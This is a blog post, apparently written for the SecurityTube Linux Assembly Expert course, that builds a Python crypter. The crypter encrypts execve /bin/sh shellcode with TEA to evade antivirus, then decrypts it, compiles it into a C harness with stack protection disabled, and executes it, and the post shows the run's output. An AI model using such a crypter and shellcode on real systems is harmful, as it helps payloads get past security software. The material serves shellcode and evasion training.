---
title:  "SLAE x86 Assignment 7: Crypter Script"
header:
  teaser: "/assets/images/slae32.png"
  teaser_home_page: true
categories:
  - exploit dev
classes: wide
tags:
  - exploit dev
  - slae
---

Hey guys! Welcome back! In this post, we will look at the last assignment of SLAE x86. Let's dive right in!

## Understanding The Objective ##
So what are crypters? Crypters are tools that can be used to encrypt sets of data, in order to make it hard or nearly impossible for AVs to detect the content of that data. In our case, we will be building a crypter which will help us encrypt our ```execve-stack``` shellcode.

Instead of going with the conventional AES symmetric algorithm, I wanted to try something else. Hence, I will be using the ```PyTEA``` library in Python for this assignment. While this is much simpler, this method has it's own drawbacks. These can be found [here.](https://en.wikipedia.org/wiki/Tiny_Encryption_Algorithm#Properties) In essence, the Tiny Encryption Algorithm uses a 128 bit key in order to encrypt.

Let's dive right in!

### Crypter Script
So this script basically generates a random key of 16 bytes. Then, encrypts the shellcode, decrypts it, and writes it to the ```shellcode.c``` file. This is then compiled and executed:
```python
# SLAE Assignment 7: Python Crypter Script
# Author:  4p0cryph0n
# Website: https://4p0cryph0n.github.io/

#!/usr/bin/python

from pytea import TEA
import os
import binascii
import time

key = os.urandom(16)
print('current key: ', key)
tea = TEA(key)
execve = b"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
e = tea.encrypt(execve)
e_hex = binascii.hexlify(e)

print('Encrypted Hex Shellcode: ' +  e_hex)
time.sleep(1)

print('Decrypting And Executing')
time.sleep(1)
decrypted = tea.decrypt(e)

print('Decrypted Shellcode: ' + decrypted)


shellfile = open("shellcode.c", "w")
shellfile.write("""#include<stdio.h>

#include<string.h>

unsigned char code[] = \\
\"""")
shellfile.close()
shellfile = open("shellcode.c", "a")
shellfile.write(decrypted)
shellfile.close()
shellfile = open("shellcode.c", "a")
shellfile.write("""";

main()
{

        printf(\"Shellcode Length:  %d\\n\", strlen(code));

        int (*ret)() = (int(*)())code;
        ret();

}""")

shellfile.close()

os.system("gcc -fno-stack-protector -z execstack shellcode.c -o shellcode && ./shellcode")
```
Alright! let's run this:
```
kali@kali ~/Desktop/SLAEx86_Assignments/assignment7 $ python crypter_tool.py
('current key: ', '\x9a\x1bZ\x7f`\xc3\xbd\xef\xbdli\x81\xe1\x97\x970')
Encrypted Hex Shellcode: efa5ae8b718d117258da58dd315b1402be6903b87b954a336d26d2f551e03b7598b2c0961e95dd2a34b8aeadabb9f96332437bbfe24cdf91bc13cf332ffe44df2a9bc8c861cd4598bd7f6d981c6c293526760d85b769830979b2809144e45a097b62c92049cdd01838e060e9741c7972
Decrypting And Executing
Decrypted Shellcode: \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
shellcode.c:8:1: warning: return type defaults to ‘int’ [-Wimplicit-int]
    8 | main()
      | ^~~~
Shellcode Length:  25
$
```
With this, we are done with all the assignments of SLAE x86! Stay tuned for SLAE x64!

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification.

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

Student ID: SLAE - 1534
